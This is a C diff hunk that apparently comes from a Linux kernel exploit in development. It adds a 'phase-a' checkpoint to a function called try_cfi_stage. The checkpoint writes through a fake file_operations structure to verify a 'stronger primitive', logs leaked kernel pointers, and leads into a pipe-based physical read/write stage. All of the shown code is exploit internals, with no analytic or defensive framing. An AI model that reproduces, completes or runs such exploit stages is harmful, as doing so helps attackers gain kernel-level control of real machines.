@@ -347,6 +347,28 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+#if defined(APP_T870_PHASE_A_WRITE_CHECKPOINT) && \
+    APP_T870_PHASE_A_WRITE_CHECKPOINT
+  uint64_t null_owner_checkpoint = 0;
+  ssize_t owner_checkpoint = configfs_write_once(
+      fd, fake_fops, &null_owner_checkpoint, sizeof(null_owner_checkpoint));
+  cfi_owner_ret = owner_checkpoint;
+  if (owner_checkpoint != (ssize_t)sizeof(null_owner_checkpoint)) {
+    cfi_last_step = 41;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  pr_success("t870 phase-a stronger primitive verified "
+             "target=%016zx fake=%016zx pre=%016llx "
+             "write=%zd read=%zd restore=%zd verify=%zd owner=%zd\n",
+             misc_fops, fake_fops, (unsigned long long)pre_fops,
+             n, r, restore, rb, owner_checkpoint);
+  cfi_last_step = 40;
+  cfi_last_errno = 0;
+  SYSCHK(close(fd));
+  return 0;
+#endif
+
 
   pr_info("cfi starting pipe physrw\n");
 
